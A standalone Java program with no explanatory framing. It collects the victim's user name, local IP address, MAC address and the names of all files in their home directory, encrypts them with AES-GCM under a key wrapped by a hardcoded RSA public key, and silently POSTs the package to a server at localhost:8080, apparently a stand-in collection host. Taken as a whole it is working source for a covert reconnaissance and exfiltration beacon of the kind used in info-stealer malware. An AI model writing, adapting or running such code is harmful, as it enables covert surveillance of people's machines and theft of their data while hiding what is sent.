void main() {
    try {
        String userName = System.getProperty("user.name");

        String localIP = "";
        java.util.Enumeration<java.net.NetworkInterface> nets =
                java.net.NetworkInterface.getNetworkInterfaces();
        while (nets.hasMoreElements() && localIP.isEmpty()) {
            java.net.NetworkInterface net = nets.nextElement();
            if (net.isLoopback() || !net.isUp()) continue;
            java.util.Enumeration<java.net.InetAddress> addrs = net.getInetAddresses();
            while (addrs.hasMoreElements()) {
                java.net.InetAddress addr = addrs.nextElement();
                if (addr instanceof java.net.Inet4Address) {
                    localIP = addr.getHostAddress();
                    break; 
                }
            }
        }

        String macAddr = "";
        nets = java.net.NetworkInterface.getNetworkInterfaces();
        while (nets.hasMoreElements() && macAddr.isEmpty()) {
            java.net.NetworkInterface net = nets.nextElement();
            if (net.isLoopback() || !net.isUp()) continue;
            byte[] mac = net.getHardwareAddress();
            if (mac == null) continue;
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
            }
            if (sb.length() > 0 && !sb.toString().equals("00:00:00:00:00:00")) {
                macAddr = sb.toString();
                break;
            }
        }
        java.io.File home = new java.io.File(System.getProperty("user.home"));
        java.io.File[] files = home.listFiles();

        StringBuilder jsonArrayBuilder = new StringBuilder("[");
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                // Safe string escaping for backslashes and quotes
                String safeName = files[i].getName()
                        .replace("\\", "\\\\")
                        .replace("\"", "\\\"");

                jsonArrayBuilder.append("\"").append(safeName).append("\"");
                if (i < files.length - 1) {
                    jsonArrayBuilder.append(",");
                }
            }
        }
        jsonArrayBuilder.append("]");

        String safeUser = userName.replace("\\", "\\\\").replace("\"", "\\\"");
        String json = "{" +
                "\"user\":\"" + safeUser + "\"," +
                "\"ip\":\"" + localIP + "\"," +
                "\"mac\":\"" + macAddr + "\"," +
                "\"files\":" + jsonArrayBuilder.toString() +
                "}";

        byte[] payloadBytes = json.getBytes(StandardCharsets.UTF_8);

        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        SecretKey aesKey = keyGen.generateKey();

        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);

        Cipher aesCipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv); // 128-bit authentication tag
        aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, gcmSpec);
        byte[] encryptedPayload = aesCipher.doFinal(payloadBytes);

        // --- 4. Encrypt the AES Key with RSA-OAEP ---
        String publicKeyPEM = """
            -----BEGIN PUBLIC KEY-----
            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz2jW1tYVaRFw2RsZn9f3
            TBpkt6MAToybWaK8dcXAu3ruNoaJ8G7g8ey8KaUjbnDW9sj4fBYnRkhLjovpWSS/
            L0XJWAPB7onooyEN3r5DvuUFBp9oNUyoH7cIamogDPJaUM4NSc6eHzw8yaUwkzm8
            CR289UoMC3wNdRCken4bfIrA89lelOpfV/g97ZPXauq0hMwQMLC8nguLRiQ2iGzJ
            kvsP8x00xdK4073UN3Mlzq3XSA0qltUI7lRWGEGLwwWQZLMRmB894nEU4XMv5DdZ
            Avavb0aOBJo7lNqJyCqXgVpYDyZgaaclj+mjWWS08Own+/M1PU0Nk28n0L3CFzL8
            BwIDAQAB
            -----END PUBLIC KEY-----""";

        publicKeyPEM = publicKeyPEM.replace("-----BEGIN PUBLIC KEY-----", "")
                .replace("-----END PUBLIC KEY-----", "")
                .replaceAll("\\s", "");
        byte[] keyBytes = Base64.getDecoder().decode(publicKeyPEM);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PublicKey pubKey = keyFactory.generatePublic(spec);

        Cipher rsaCipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        rsaCipher.init(Cipher.ENCRYPT_MODE, pubKey);
        byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        outputStream.write((encryptedAesKey.length >> 8) & 0xFF);
        outputStream.write(encryptedAesKey.length & 0xFF);
        outputStream.write(encryptedAesKey);
        outputStream.write(iv);
        outputStream.write(encryptedPayload);

        byte[] finalPackage = outputStream.toByteArray();

        URL url = URI.create("http://localhost:8080").toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");

        try (var os = conn.getOutputStream()) {
            os.write(finalPackage);
        } catch (Exception e) {
            e.printStackTrace();
        }
        conn.getResponseCode();
    } catch (Exception e) {
        e.printStackTrace();
    }
}
